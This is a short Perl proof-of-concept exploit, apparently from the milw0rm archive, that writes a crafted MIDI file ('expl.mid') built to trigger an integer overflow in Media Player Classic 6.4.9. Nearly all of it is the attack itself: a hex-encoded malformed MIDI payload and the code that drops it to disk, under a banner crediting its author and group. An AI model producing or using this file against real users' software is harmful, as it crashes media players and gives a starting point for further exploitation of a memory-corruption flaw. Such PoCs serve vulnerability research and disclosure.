#! /usr/bin/perl

print qq(

  ############################################################
  ##            Iranian Pentesters Home                     ##
  ##               Www.Pentesters.Ir                        ##
  ##              PLATEN -[ H.jafari ]-                     ## 
  ## Media Player Classic 6.4.9(.mid) Integer Overflow PoC  ##
  ## Vulnerability Discovered By : PLATEN                   ##
  ## E-mail && blog:                                        ##
  ## hjafari.blogspot.com                                   ##
  ## platen.secure[at]gmail[dot]com                         ## 
  ## Greetings: Cru3l.b0y, b3hz4d, Cdef3nder                ##
  ## and all members in Pentesters.ir                       ##
  ############################################################
);

$boom = "\x4d\x54\x68\x64\x00\x00\x00\x06\x00\x01\x00\x01\x00\x60\x4d\x54".
"\x72\x6b\x00\x00\x00\x4e\x00\xff\x03\x08\x34\x31\x33\x61\x34\x61".
"\x35\x30\x00\x91\x41\x60\x01\x3a\x60\x01\x4a\x60\x01\x50\x60\x7d".
"\x81\x41\x01\x01\x3a\x5f\x8d\xe4\xa0\x01\x50\x01\x3d\x91\x41\x60".
"\x81\x00\x81\x41\x40\x00\x91\x3a\x60\x81\x00\x76\x6f\xcc\x3d\xa6".
"\xc2\x48\xee\x8e\xca\xc2\x57\x00\x91\x50\x60\x81\x00\x81\x50\x40".
"\x00\xff\x2f\x00";

open(fhandle,'>>expl.mid') || die "can't create file: expl.mid";
print fhandle $boom;
close(fhandle);
print "\n  [+] File created successfully: expl.mid \n";

# milw0rm.com [2009-09-09]
